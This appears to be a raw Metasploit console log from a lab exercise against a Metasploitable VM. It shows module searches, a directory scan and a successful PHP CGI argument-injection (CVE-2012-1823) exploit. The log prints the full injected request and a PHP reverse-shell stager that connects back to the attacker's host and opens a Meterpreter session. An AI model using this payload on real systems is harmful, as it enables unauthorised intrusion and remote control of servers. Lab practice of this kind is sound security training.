+   30   auxiliary/[45mscanner[0m/http/http_traversal                                                   normal  No     Generic HTTP [45mDir[0mectory Traversal Utility
+   31   auxiliary/[45mscanner[0m/http/gitlab_user_enum                                2014-11-21       normal  No     GitLab User Enumeration
+   32   auxiliary/[45mscanner[0m/http/grafana_plugin_traversal                                         normal  No     Grafana Plugin Path Traversal
+   33   auxiliary/[45mscanner[0m/http/hp_imc_bims_downloadservlet_traversal                            normal  No     HP Intelligent Management BIMS DownloadServlet [45mDir[0mectory Traversal
+   34   auxiliary/[45mscanner[0m/http/hp_imc_faultdownloadservlet_traversal                            normal  No     HP Intelligent Management FaultDownloadServlet [45mDir[0mectory Traversal
+   35   auxiliary/[45mscanner[0m/http/hp_imc_ictdownloadservlet_traversal                              normal  No     HP Intelligent Management IctDownloadServlet [45mDir[0mectory Traversal
+   36   auxiliary/[45mscanner[0m/http/hp_imc_reportimgservlt_traversal                                 normal  No     HP Intelligent Management ReportImgServlt [45mDir[0mectory Traversal
+   37   auxiliary/[45mscanner[0m/http/brute_[45mdir[0ms                                                       normal  No     HTTP [45mDir[0mectory Brute Force [45mScanner[0m
+   38   auxiliary/[45mscanner[0m/http/[45mdir[0m_listing                                                      normal  No     HTTP [45mDir[0mectory Listing [45mScanner[0m
+   39   auxiliary/[45mscanner[0m/http/[45mdir[0m_[45mscanner[0m                                                      normal  No     HTTP [45mDir[0mectory [45mScanner[0m
+   40   auxiliary/[45mscanner[0m/http/file_same_name_[45mdir[0m                                               normal  No     HTTP File Same Name [45mDir[0mectory [45mScanner[0m
+   41   auxiliary/[45mscanner[0m/http/files_[45mdir[0m                                                        normal  No     HTTP Interesting File [45mScanner[0m
+   42   auxiliary/[45mscanner[0m/http/lucky_punch                                                      normal  No     HTTP Microsoft SQL Injection Table XSS Infection
+   43   auxiliary/[45mscanner[0m/http/prev_[45mdir[0m_same_name_file                                          normal  No     HTTP Previous [45mDir[0mectory File [45mScanner[0m
+   44   auxiliary/[45mscanner[0m/http/svn_[45mscanner[0m                                                      normal  No     HTTP Subversion [45mScanner[0m
+   45   auxiliary/[45mscanner[0m/http/ntlm_info_enumeration                                            normal  No     Host Information Enumeration via NTLM Authentication
+   46   auxiliary/[45mscanner[0m/http/httpdasm_[45mdir[0mectory_traversal                                     normal  No     Httpdasm [45mDir[0mectory Traversal
+   47   auxiliary/[45mscanner[0m/ipmi/ipmi_dumphashes                                 2013-06-20       normal  No     IPMI 2.0 RAKP Remote SHA1 Password Hash Retrieval
+   48   auxiliary/[45mscanner[0m/http/icinga_static_library_file_[45mdir[0mectory_traversal  2022-05-09       normal  Yes    Icingaweb [45mDir[0mectory Traversal in Static Library File Requests
+   49   auxiliary/[45mscanner[0m/scada/indusoft_ntwebserver_fileaccess                                 normal  No     Indusoft WebStudio NTWebServer Remote File Access
+   50   auxiliary/[45mscanner[0m/tftp/ipswitch_whatsupgold_tftp                       2011-12-12       normal  No     IpSwitch WhatsUp Gold TFTP [45mDir[0mectory Traversal
+   51   auxiliary/[45mscanner[0m/http/kodi_traversal                                  2017-02-12       normal  No     Kodi 17.0 Local File Inclusion Vulnerability
+   52   auxiliary/[45mscanner[0m/ftp/konica_ftp_traversal                             2015-09-22       normal  Yes    Konica Minolta FTP Utility 1.00 [45mDir[0mectory Traversal Information Disclosure
+   53   auxiliary/[45mscanner[0m/scada/koyo_login                                     2012-01-19       normal  No     Koyo [45mDir[0mectLogic PLC Password Brute Force Utility
+   54   auxiliary/[45mscanner[0m/http/linksys_e1500_traversal                                          normal  No     Linksys E1500 [45mDir[0mectory Traversal Vulnerability
+   55   auxiliary/[45mscanner[0m/rsync/modules_list                                                    normal  No     List Rsync Modules
+   56   auxiliary/[45mscanner[0m/http/[45mdir[0m_webdav_unicode_bypass                                        normal  No     MS09-020 IIS6 WebDAV Unicode Auth Bypass [45mDir[0mectory [45mScanner[0m
+   57   auxiliary/[45mscanner[0m/mysql/mysql_writable_[45mdir[0ms                                             normal  No     MYSQL [45mDir[0mectory Write Test
+   58   auxiliary/[45mscanner[0m/mysql/mysql_file_enum                                                 normal  No     MYSQL File/[45mDir[0mectory Enumerator
+   59   auxiliary/[45mscanner[0m/http/majordomo2_[45mdir[0mectory_traversal                  2011-03-08       normal  No     Majordomo2 _list_file_get() [45mDir[0mectory Traversal
+   60   auxiliary/[45mscanner[0m/http/manageengine_deviceexpert_traversal             2012-03-18       normal  No     ManageEngine DeviceExpert 5.6 ScheduleResultViewer FileName Traversal
+   61   auxiliary/[45mscanner[0m/http/manageengine_securitymanager_traversal          2012-10-19       normal  No     ManageEngine SecurityManager Plus 5.5 [45mDir[0mectory Traversal
+   62   auxiliary/[45mscanner[0m/http/support_center_plus_[45mdir[0mectory_traversal         2014-01-28       normal  No     ManageEngine Support Center Plus [45mDir[0mectory Traversal
+   63   auxiliary/[45mscanner[0m/http/azure_ad_login                                                   normal  No     Microsoft Azure Active [45mDir[0mectory Login Enumeration
+   64   auxiliary/[45mscanner[0m/http/exchange_web_server_pushsubscription            2019-01-21       normal  No     Microsoft Exchange Privilege Escalation Exploit
+   65   auxiliary/[45mscanner[0m/http/iis_internal_ip                                                  normal  No     Microsoft IIS HTTP Internal IP Disclosure
+   66   auxiliary/[45mscanner[0m/scada/moxa_discover                                                   normal  No     Moxa UDP Device Discovery
+   67   auxiliary/[45mscanner[0m/http/novell_file_reporter_fsfui_fileaccess           2012-11-16       normal  No     NFR Agent FSFUI Record Arbitrary Remote File Access
+   68   auxiliary/[45mscanner[0m/tftp/netdecision_tftp                                2009-05-16       normal  No     NetDecision 4.2 TFTP [45mDir[0mectory Traversal
+   69   auxiliary/[45mscanner[0m/http/netdecision_traversal                           2012-03-07       normal  No     NetDecision NOCVision Server [45mDir[0mectory Traversal
+   70   auxiliary/[45mscanner[0m/http/netgear_sph200d_traversal                                        normal  No     Netgear SPH200D [45mDir[0mectory Traversal Vulnerability
+   71   auxiliary/[45mscanner[0m/http/groupwise_agents_http_traversal                                  normal  No     Novell Groupwise Agents HTTP [45mDir[0mectory Traversal
+   72   auxiliary/[45mscanner[0m/misc/zenworks_preboot_fileaccess                                      normal  No     Novell ZENworks Configuration Management Preboot Service Remote File Access
+   73   auxiliary/[45mscanner[0m/ftp/pcman_ftp_traversal                              2015-09-28       normal  Yes    PCMan FTP Server 2.0.7 [45mDir[0mectory Traversal Information Disclosure
+   74   auxiliary/[45mscanner[0m/http/glassfish_traversal                             2015-08-08       normal  No     Path Traversal in Oracle GlassFish Server Open Source Edition
+   75   auxiliary/[45mscanner[0m/printer/printer_list_[45mdir[0m                                              normal  No     Printer [45mDir[0mectory Listing [45mScanner[0m
+   76   auxiliary/[45mscanner[0m/http/rips_traversal                                                   normal  No     RIPS [45mScanner[0m [45mDir[0mectory Traversal
+   77   auxiliary/[45mscanner[0m/http/radware_app[45mdir[0mector_enum                                         normal  No     Radware App[45mDir[0mector Bruteforce Login Utility
+   78   auxiliary/[45mscanner[0m/redis/file_upload                                    2015-11-11       normal  No     Redis File Upload
+   79   auxiliary/[45mscanner[0m/http/s40_traversal                                   2011-04-07       normal  No     S40 0.4.2 CMS [45mDir[0mectory Traversal Vulnerability
+   80   auxiliary/[45mscanner[0m/sap/sap_soap_rfc_eps_get_[45mdir[0mectory_listing                            normal  No     SAP SOAP RFC EPS_GET_[45mDIR[0mECTORY_LISTING [45mDir[0mectories Information Disclosure
+   81   auxiliary/[45mscanner[0m/sap/sap_soap_rfc_rzl_read_[45mdir[0m                                         normal  No     SAP SOAP RFC RZL_READ_[45mDIR[0m_LOCAL [45mDir[0mectory Contents Listing
+   82   auxiliary/[45mscanner[0m/sap/sap_web_gui_brute_login                                           normal  No     SAP Web GUI Login Brute Forcer
+   83   auxiliary/admin/smb/check_[45mdir[0m_file                                                      normal  No     SMB [45mScanner[0m Check File/[45mDir[0mectory Utility
+   84   auxiliary/[45mscanner[0m/smb/smb_enumshares                                                    normal  No     SMB Share Enumeration
+   85   auxiliary/[45mscanner[0m/ssh/ssh_login_pubkey                                                  normal  No     SSH Public Key Login [45mScanner[0m
+   86   auxiliary/[45mscanner[0m/scada/sielco_winlog_fileaccess                                        normal  No     Sielco Sistemi Winlog Remote File Access
+   87   auxiliary/[45mscanner[0m/http/simple_webserver_traversal                      2013-01-03       normal  No     Simple Web Server 2.3-RC1 [45mDir[0mectory Traversal
+   88   auxiliary/[45mscanner[0m/http/sockso_traversal                                2012-03-14       normal  No     Sockso Music Host Server 1.5 [45mDir[0mectory Traversal
+   89   auxiliary/[45mscanner[0m/http/springcloud_traversal                           2019-04-17       normal  No     Spring Cloud Config Server [45mDir[0mectory Traversal
+   90   auxiliary/[45mscanner[0m/http/smt_ipmi_url_re[45mdir[0mect_traversal                 2013-11-06       normal  No     Supermicro Onboard IPMI url_re[45mdir[0mect.cgi Authenticated [45mDir[0mectory Traversal
+   91   auxiliary/[45mscanner[0m/http/surgenews_user_creds                            2017-06-16       normal  Yes    SurgeNews User Credentials
+   92   auxiliary/[45mscanner[0m/http/sybase_easerver_traversal                       2011-05-25       normal  No     Sybase Easerver 6.3 [45mDir[0mectory Traversal
+   93   auxiliary/[45mscanner[0m/http/symantec_brightmail_logfile                     2012-11-30       normal  No     Symantec Messaging Gateway 9.5 Log File Download Vulnerability
+   94   auxiliary/[45mscanner[0m/http/tplink_traversal_noauth                                          normal  No     TP-Link Wireless Lite N Access Point [45mDir[0mectory Traversal Vulnerability
+   95   auxiliary/[45mscanner[0m/http/tvt_nvms_traversal                              2019-12-12       normal  No     TVT NVMS-1000 [45mDir[0mectory Traversal
+   96   auxiliary/[45mscanner[0m/http/thinvnc_traversal                               2019-10-16       normal  No     ThinVNC [45mDir[0mectory Traversal
+   97   auxiliary/[45mscanner[0m/http/titan_ftp_admin_pwd                                              normal  No     Titan FTP Administrative Password Disclosure
+   98   auxiliary/[45mscanner[0m/ftp/titanftp_xcrc_traversal                          2010-06-15       normal  No     Titan FTP XCRC [45mDir[0mectory Traversal Information Disclosure
+   99   auxiliary/[45mscanner[0m/http/totaljs_traversal                               2019-02-18       normal  Yes    Total.js prior to 3.2.4 [45mDir[0mectory Traversal
+   100  auxiliary/[45mscanner[0m/vmware/vmware_update_manager_traversal               2011-11-21       normal  No     VMWare Update Manager 4 [45mDir[0mectory Traversal
+   101  auxiliary/[45mscanner[0m/vmware/vmware_server_[45mdir[0m_trav                                         normal  No     VMware Server [45mDir[0mectory Traversal Vulnerability
+   102  auxiliary/[45mscanner[0m/http/wangkongbao_traversal                                            normal  No     WANGKONGBAO CNS-1000 and 1100 UTM [45mDir[0mectory Traversal
+   103  auxiliary/[45mscanner[0m/http/webpagetest_traversal                           2012-07-13       normal  No     WebPageTest [45mDir[0mectory Traversal
+   104  auxiliary/[45mscanner[0m/http/wildfly_traversal                               2014-10-22       normal  No     WildFly [45mDir[0mectory Traversal
+   105  auxiliary/[45mscanner[0m/http/wp_dukapress_file_read                                           normal  No     WordPress DukaPress Plugin File Read Vulnerability
+   106  auxiliary/[45mscanner[0m/http/wp_duplicator_file_read                         2020-02-19       normal  No     WordPress Duplicator File Read Vulnerability
+   107  auxiliary/[45mscanner[0m/http/wp_easy_wp_smtp                                 2020-12-06       normal  No     WordPress Easy WP SMTP Password Reset
+   108  auxiliary/[45mscanner[0m/http/wp_gimedia_library_file_read                                     normal  No     WordPress GI-Media Library Plugin [45mDir[0mectory Traversal Vulnerability
+   109  auxiliary/[45mscanner[0m/http/wp_mobileedition_file_read                                       normal  No     WordPress Mobile Edition File Read Vulnerability
+   110  auxiliary/[45mscanner[0m/http/wp_nextgen_galley_file_read                                      normal  No     WordPress NextGEN Gallery [45mDir[0mectory Read Vulnerability
+   111  auxiliary/[45mscanner[0m/http/wp_simple_backup_file_read                                       normal  No     WordPress Simple Backup File Read Vulnerability
+   112  auxiliary/[45mscanner[0m/http/wp_subscribe_comments_file_read                                  normal  No     WordPress Subscribe Comments File Read Vulnerability
+   113  auxiliary/[45mscanner[0m/http/yaws_traversal                                  2011-11-25       normal  No     Yaws Web Server [45mDir[0mectory Traversal
+   114  auxiliary/[45mscanner[0m/http/zenload_balancer_traversal                      2020-04-10       normal  No     Zen Load Balancer [45mDir[0mectory Traversal
+   115  auxiliary/[45mscanner[0m/http/cgit_traversal                                  2018-08-03       normal  No     cgit [45mDir[0mectory Traversal
+
+
+Interact with a module by name or index. For example [32minfo 115[0m, [32muse 115[0m or [32muse auxiliary/scanner/http/cgit_traversal[0m
+
+[4mmsf6[0m [0m> search dir_scanner
+[0m
+Matching Modules
+================
+
+   #  Name                                Disclosure Date  Rank    Check  Description
+   -  ----                                ---------------  ----    -----  -----------
+   0  auxiliary/scanner/http/[45mdir_scanner[0m                   normal  No     HTTP Directory Scanner
+
+
+Interact with a module by name or index. For example [32minfo 0[0m, [32muse 0[0m or [32muse auxiliary/scanner/http/dir_scanner[0m
+
+[4mmsf6[0m [0m> use 0
+[0m[4mmsf6[0m auxiliary([1m[31mscanner/http/dir_scanner[0m) [0m> show options
+[0m
+Module options (auxiliary/scanner/http/dir_scanner):
+
+   Name        Current Setting                                   Required  Description
+   ----        ---------------                                   --------  -----------
+   DICTIONARY  /usr/share/metasploit-framework/data/wmap/wmap_d  no        Path of word dictionary to use
+               irs.txt
+   PATH        /                                                 yes       The path  to identify files
+   Proxies                                                       no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                                                        yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-me
+                                                                           tasploit.html
+   RPORT       80                                                yes       The target port (TCP)
+   SSL         false                                             no        Negotiate SSL/TLS for outgoing connections
+   THREADS     1                                                 yes       The number of concurrent threads (max one per host)
+   VHOST                                                         no        HTTP server virtual host
+
+
+View the full module info with the [32minfo[0m, or [32minfo -d[0m command.
+
+[4mmsf6[0m auxiliary([1m[31mscanner/http/dir_scanner[0m) [0m> set RHOSTS 192.168.56.101
+[0mRHOSTS => 192.168.56.101
+[4mmsf6[0m auxiliary([1m[31mscanner/http/dir_scanner[0m) [0m> RUN
+[0m[1m[31m[-][0m Unknown command: RUN
+[4mmsf6[0m auxiliary([1m[31mscanner/http/dir_scanner[0m) [0m> run
+[0m
+[1m[34m[*][0m Detecting error code
+[1m[34m[*][0m Using code '404' as not found for 192.168.56.101
+[1m[32m[+][0m Found http://192.168.56.101:80/cgi-bin/ 403 (192.168.56.101)
+[1m[32m[+][0m Found http://192.168.56.101:80/doc/ 200 (192.168.56.101)
+[1m[32m[+][0m Found http://192.168.56.101:80/icons/ 200 (192.168.56.101)
+[1m[32m[+][0m Found http://192.168.56.101:80/index/ 200 (192.168.56.101)
+[1m[32m[+][0m Found http://192.168.56.101:80/phpMyAdmin/ 200 (192.168.56.101)
+[1m[32m[+][0m Found http://192.168.56.101:80/test/ 200 (192.168.56.101)
+[1m[34m[*][0m Scanned 1 of 1 hosts (100% complete)
+[1m[34m[*][0m Auxiliary module execution completed
+[4mmsf6[0m auxiliary([1m[31mscanner/http/dir_scanner[0m) [0m> back
+[0m[4mmsf6[0m [0m> search cgi[K[K[K[K php_cgi
+[0m
+Matching Modules
+================
+
+   #  Name                                      Disclosure Date  Rank       Check  Description
+   -  ----                                      ---------------  ----       -----  -----------
+   0  exploit/multi/http/[45mphp_cgi[0m_arg_injection  2012-05-03       [32mexcellent[0m  Yes    PHP CGI Argument Injection
+
+
+Interact with a module by name or index. For example [32minfo 0[0m, [32muse 0[0m or [32muse exploit/multi/http/php_cgi_arg_injection[0m
+
+[4mmsf6[0m [0m> use 0
+[0m[1m[34m[*][0m No payload configured, defaulting to php/meterpreter/reverse_tcp
+[4mmsf6[0m exploit([1m[31mmulti/http/php_cgi_arg_injection[0m) [0m> show options
+[0m
+Module options (exploit/multi/http/php_cgi_arg_injection):
+
+   Name         Current Setting  Required  Description
+   ----         ---------------  --------  -----------
+   PLESK        false            yes       Exploit Plesk
+   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                        yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT        80               yes       The target port (TCP)
+   SSL          false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI                     no        The URI to request (must be a CGI-handled PHP script)
+   URIENCODING  0                yes       Level of URI URIENCODING and padding (0 for minimum)
+   VHOST                         no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.0.3.15        yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+
+View the full module info with the [32minfo[0m, or [32minfo -d[0m command.
+
+[4mmsf6[0m exploit([1m[31mmulti/http/php_cgi_arg_injection[0m) [0m> [K[4mmsf6[0m exploit([1m[31mmulti/http/php_cgi_arg_injection[0m) [0m> ser [K[Kt RHOSTS 192.168.56.101
+[0mRHOSTS => 192.168.56.101
+[4mmsf6[0m exploit([1m[31mmulti/http/php_cgi_arg_injection[0m) [0m> S[Kexploit
+[0m
+[1m[34m[*][0m Started reverse TCP handler on 10.0.3.15:4444 
+[1m[34m[*][0m Exploit completed, but no session was created.
+[4mmsf6[0m exploit([1m[31mmulti/http/php_cgi_arg_injection[0m) [0m> exokiu[K[K[K[Kploit
+[0m
+[1m[34m[*][0m Started reverse TCP handler on 10.0.3.15:4444 
+[1m[34m[*][0m Exploit completed, but no session was created.
+[4mmsf6[0m exploit([1m[31mmulti/http/php_cgi_arg_injection[0m) [0m> ping [K[K[K[K[Kinfo
+[0m
+       Name: PHP CGI Argument Injection
+     Module: exploit/multi/http/php_cgi_arg_injection
+   Platform: PHP
+       Arch: php
+ Privileged: No
+    License: Metasploit Framework License (BSD)
+       Rank: Excellent
+  Disclosed: 2012-05-03
+
+Provided by:
+  egypt <egypt@metasploit.com>
+  hdm <x@hdm.io>
+  jjarmoc
+  kingcope
+  juan vazquez <juan.vazquez@metasploit.com>
+
+Module side effects:
+ ioc-in-logs
+
+Module stability:
+ crash-safe
+
+Module reliability:
+ repeatable-session
+
+Available targets:
+      Id  Name
+      --  ----
+  =>  0   Automatic
+
+Check supported:
+  Yes
+
+Basic options:
+  Name         Current Setting  Required  Description
+  ----         ---------------  --------  -----------
+  PLESK        false            yes       Exploit Plesk
+  Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
+  RHOSTS       192.168.56.101   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+  RPORT        80               yes       The target port (TCP)
+  SSL          false            no        Negotiate SSL/TLS for outgoing connections
+  TARGETURI                     no        The URI to request (must be a CGI-handled PHP script)
+  URIENCODING  0                yes       Level of URI URIENCODING and padding (0 for minimum)
+  VHOST                         no        HTTP server virtual host
+
+Payload information:
+  Space: 262144
+
+Description:
+  When run as a CGI, PHP up to version 5.3.12 and 5.4.2 is vulnerable to
+  an argument injection vulnerability.  This module takes advantage of
+  the -d flag to set php.ini directives to achieve code execution.
+
+  From the advisory: "if there is NO unescaped '=' in the query string,
+  the string is split on '+' (encoded space) characters, urldecoded,
+  passed to a function that escapes shell metacharacters (the "encoded in
+  a system-defined manner" from the RFC) and then passes them to the CGI
+  binary." This module can also be used to exploit the plesk 0day disclosed
+  by kingcope and exploited in the wild on June 2013.
+
+References:
+  https://nvd.nist.gov/vuln/detail/CVE-2012-1823
+  OSVDB (81633)
+  OSVDB (93979)
+  https://www.exploit-db.com/exploits/25986
+  http://web.archive.org/web/20120503154724/http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/
+  http://kb.parallels.com/en/116241
+
+
+View the full module info with the [32minfo -d[0m command.
+
+[4mmsf6[0m exploit([1m[31mmulti/http/php_cgi_arg_injection[0m) [0m> exploit
+[0m
+[1m[34m[*][0m Started reverse TCP handler on 10.0.3.15:4444 
+[1m[34m[*][0m Exploit completed, but no session was created.
+[4mmsf6[0m exploit([1m[31mmulti/http/php_cgi_arg_injection[0m) [0m> set RPORT 4444
+[0mRPORT => 4444
+[4mmsf6[0m exploit([1m[31mmulti/http/php_cgi_arg_injection[0m) [0m> set RPORT 4444[P[P[P[P[P[P[Pexploit
+[0m
+[1m[34m[*][0m Started reverse TCP handler on 10.0.3.15:4444 
+[1m[34m[*][0m Exploit completed, but no session was created.
+[4mmsf6[0m exploit([1m[31mmulti/http/php_cgi_arg_injection[0m) [0m> exploit[K[K[K[K[K[K[KSET Rpo[K[KPORT 80
+[0m[1m[31m[-][0m Unknown command: SET
+[4mmsf6[0m exploit([1m[31mmulti/http/php_cgi_arg_injection[0m) [0m> set RPORT 80
+[0mRPORT => 80
+[4mmsf6[0m exploit([1m[31mmulti/http/php_cgi_arg_injection[0m) [0m> S[Kset LPORT 80
+[0mLPORT => 80
+[4mmsf6[0m exploit([1m[31mmulti/http/php_cgi_arg_injection[0m) [0m> set LPORT 80R[C[C[C[C[C[C[CSET[C[C[C[C[C[C[C[C[C[P[P[P[P[Pexploit
+[0m
+[1m[34m[*][0m Started reverse TCP handler on 10.0.3.15:80 
+[1m[34m[*][0m Exploit completed, but no session was created.
+[4mmsf6[0m exploit([1m[31mmulti/http/php_cgi_arg_injection[0m) [0m> set verbose true
+[0mverbose => true
+[4mmsf6[0m exploit([1m[31mmulti/http/php_cgi_arg_injection[0m) [0m> set verbose true[P[P[P[P[P[P[P[P[Pexploit
+[0m
+[1m[34m[*][0m Started reverse TCP handler on 10.0.3.15:80 
+[1m[34m[*][0m Exploit completed, but no session was created.
+[4mmsf6[0m exploit([1m[31mmulti/http/php_cgi_arg_injection[0m) [0m> set HttpTrace true
+[0mHttpTrace => true
+[4mmsf6[0m exploit([1m[31mmulti/http/php_cgi_arg_injection[0m) [0m> exploit
+[0m
+[1m[34m[*][0m Started reverse TCP handler on 10.0.3.15:80 
+####################
+# Request:
+####################
+[0m[1m[31mPOST /?--define+allow_url_include%3dtruE+--define+safe_mode%3dOFF+--define+suhosin.simulation%3dTruE+-%64+disable_functions%3d%22%22+-d+open_basedir%3dnone+-%64+auto_prepend_file%3dphp://input+-d+cgi.force_redirect%3dofF+-%64+cgi.redirect_status_env%3d0+-%6e HTTP/1.1
+Host: 192.168.56.101
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 1114
+
+<?php /*<?php /**/ error_reporting(0); $ip = '10.0.3.15'; $port = 80; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();[0m
+####################
+# Response:
+####################
+[0m[1m[34mHTTP/1.1 200 OK
+Date: Mon, 24 Jul 2023 21:53:41 GMT
+Server: Apache/2.2.8 (Ubuntu) DAV/2
+X-Powered-By: PHP/5.2.4-2ubuntu5.10
+Content-Length: 0
+Content-Type: text/html
+
+[0m
+[1m[34m[*][0m Exploit completed, but no session was created.
+[4mmsf6[0m exploit([1m[31mmulti/http/php_cgi_arg_injection[0m) [0m> exploitset HttpTrace true[P[P[P[P[P[P[P[P[P[P[Pexploitset verbose true[K[K[K[K[K[K[K[K[K[K[K[KLPORT 4444
+[0mLPORT => 4444
+[4mmsf6[0m exploit([1m[31mmulti/http/php_cgi_arg_injection[0m) [0m> set RPORT 80
+[0mRPORT => 80
+[4mmsf6[0m exploit([1m[31mmulti/http/php_cgi_arg_injection[0m) [0m> set r[KLHOST[K[K[K[K[K[K[K[K[Kshow options
+[0m
+Module options (exploit/multi/http/php_cgi_arg_injection):
+
+   Name         Current Setting  Required  Description
+   ----         ---------------  --------  -----------
+   PLESK        false            yes       Exploit Plesk
+   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS       192.168.56.101   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT        80               yes       The target port (TCP)
+   SSL          false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI                     no        The URI to request (must be a CGI-handled PHP script)
+   URIENCODING  0                yes       Level of URI URIENCODING and padding (0 for minimum)
+   VHOST                         no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.0.3.15        yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+
+View the full module info with the [32minfo[0m, or [32minfo -d[0m command.
+
+[4mmsf6[0m exploit([1m[31mmulti/http/php_cgi_arg_injection[0m) [0m> set LHOST 192.168.56.103
+[0mLHOST => 192.168.56.103
+[4mmsf6[0m exploit([1m[31mmulti/http/php_cgi_arg_injection[0m) [0m> E[Kexploit
+[0m
+[1m[34m[*][0m Started reverse TCP handler on 192.168.56.103:4444 
+####################
+# Request:
+####################
+[0m[1m[31mPOST /?-%64+allow_url_include%3d1+--define+safe_mode%3dfalse+--define+suhosin.simulation%3dON+--define+disable_functions%3d%22%22+-%64+open_basedir%3dnone+-d+auto_prepend_file%3dphp://input+-%64+cgi.force_redirect%3dFALSE+--define+cgi.redirect_status_env%3d0+-n HTTP/1.1
+Host: 192.168.56.101
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 1121
+
+<?php /*<?php /**/ error_reporting(0); $ip = '192.168.56.103'; $port = 4444; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();[0m
+[1m[34m[*][0m Sending stage (39927 bytes) to 192.168.56.101
+[0m####################
+# Response:
+####################
+No response received
+[1m[34m[*][0m Meterpreter session 1 opened (192.168.56.103:4444 -> 192.168.56.101:42655) at 2023-07-24 17:55:25 -0400
+
+[0m[4mmeterpreter[0m > sysinfo
+[0mComputer    : metasploitable
+OS          : Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686
+Meterpreter : php/linux
+[4mmeterpreter[0m > l[Kdir
+[0mListing: /var/www
+=================
+
+Mode              Size            Type  Last modified                      Name
+----              ----            ----  -------------                      ----
+041777/rwxrwxrwx  17592186048512  dir   182042302250-03-10 11:10:13 -0400  dav
+040755/rwxr-xr-x  17592186048512  dir   182042482449-05-12 11:17:21 -0400  dvwa
+100644/rw-r--r--  3826815861627   fil   182042311505-02-17 18:13:29 -0500  index.php
+040755/rwxr-xr-x  17592186048512  dir   181964996940-05-31 14:38:18 -0400  mutillidae
+040755/rwxr-xr-x  17592186048512  dir   181964937872-02-08 13:03:20 -0500  phpMyAdmin
+100644/rw-r--r--  81604378643     fil   173039983614-08-05 02:08:28 -0400  phpinfo.php
+040755/rwxr-xr-x  17592186048512  dir   181965051925-08-30 13:04:46 -0400  test
+040775/rwxrwxr-x  87960930242560  dir   173083439924-11-22 07:50:32 -0500  tikiwiki
+040775/rwxrwxr-x  87960930242560  dir   173040024853-07-11 18:58:19 -0400  tikiwiki-old
+040755/rwxr-xr-x  17592186048512  dir   173046477589-12-24 16:59:26 -0500  twiki
+
+[4mmeterpreter[0m > echo Hola > e.php
+[0m[1m[31m[-][0m Unknown command: echo
+[4mmeterpreter[0m > print Hola > e.php
+[0m[1m[31m[-][0m Unknown command: print
+[4mmeterpreter[0m > help
+[0m
+Core Commands
+=============
+
+    Command       Description
+    -------       -----------
+    ?             Help menu
+    background    Backgrounds the current session
+    bg            Alias for background
+    bgkill        Kills a background meterpreter script
+    bglist        Lists running background scripts
+    bgrun         Executes a meterpreter script as a background thread
+    channel       Displays information or control active channels
+    close         Closes a channel
+    detach        Detach the meterpreter session (for http/https)
+    disable_unic  Disables encoding of unicode strings
+    ode_encoding
